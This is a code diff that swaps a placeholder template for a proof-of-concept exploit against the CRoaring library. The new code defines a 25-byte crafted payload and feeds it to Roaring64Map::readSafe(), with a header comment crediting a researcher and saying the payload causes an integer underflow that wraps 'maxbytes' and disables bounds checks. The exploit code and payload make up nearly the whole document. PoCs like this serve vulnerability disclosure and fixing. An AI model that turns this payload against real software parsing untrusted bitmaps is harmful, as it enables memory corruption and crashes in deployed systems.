@@ -1,38 +1,35 @@
-/*
- * Proof of Concept for CRoaring Vulnerability
- * 
- * Description:
- *   This file contains a proof-of-concept exploit demonstrating
- *   a vulnerability discovered in CRoaring library.
- *
- * Compilation:
- *   g++ -o poc poc.cpp -lroaring
- *
- * Usage:
- *   ./poc
- *
- * Author: [Researcher Name]
- * Date: January 2026
+/**
+ * Target: CRoaring (Roaring64Map)
+ * Vulnerability: Integer Underflow in readSafe()
+ * Credit: Oleg Lazari
+ * * Description:
+ * A malicious payload triggers an unsigned integer underflow during 
+ * the parsing of the bitmap size. This causes a wrap-around of the 
+ * 'maxbytes' variable, effectively disabling subsequent bounds checks.
  */
 
 #include <iostream>
-#include <cstdlib>
+#include <vector>
+#include "roaring/roaring64map.hh"
 
-// Include CRoaring headers
-// #include <roaring/roaring.h>
+int main() {
+    // Malicious payload (25 bytes)
+    // Crafted to trigger tz > maxbytes in roaring64map.hh
+    unsigned char payload[] = {
+        0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00,
+        0x3b, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x6a, 0x6a, 0xd4
+    };
 
-int main(int argc, char* argv[]) {
-    std::cout << "CRoaring Vulnerability PoC" << std::endl;
-    std::cout << "=========================" << std::endl;
-    
-    // TODO: Implement proof-of-concept code
-    // This is a placeholder that demonstrates the vulnerability
-    
-    std::cout << "Initializing test case..." << std::endl;
-    
-    // Add PoC code here
-    
-    std::cout << "PoC execution completed." << std::endl;
+    try {
+        // Triggering the vulnerable read
+        roaring::Roaring64Map::readSafe((const char*)payload, sizeof(payload));
+    } catch (const std::exception& e) {
+        std::cerr << "Caught exception: " << e.what() << std::endl;
+    } catch (...) {
+        std::cerr << "Caught unknown exception during parse." << std::endl;
+    }
     
     return 0;
 }
